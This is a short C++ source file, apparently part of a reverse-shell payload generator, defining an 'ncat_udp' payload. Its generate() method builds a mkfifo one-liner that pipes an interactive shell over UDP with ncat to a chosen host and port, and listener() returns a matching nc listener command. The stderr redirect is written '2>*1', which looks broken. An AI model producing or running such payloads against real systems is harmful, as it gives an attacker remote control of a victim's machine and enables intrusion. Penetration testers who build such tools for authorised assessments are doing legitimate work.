#include "Ncat_UDP_Payload.h"
#include "../../listeners/ListenerFactory.h"

std::string NcatUDPPayload::name() const {
return "ncat_udp";
}

std::string NcatUDPPayload::generate(const Options& opts) const {
    return "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|" + opts.interpreter + " -i 2>*1|ncat -u " + opts.host + " " + std::to_string(opts.port) + " >/tmp/f";
}

std::string NcatUDPPayload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}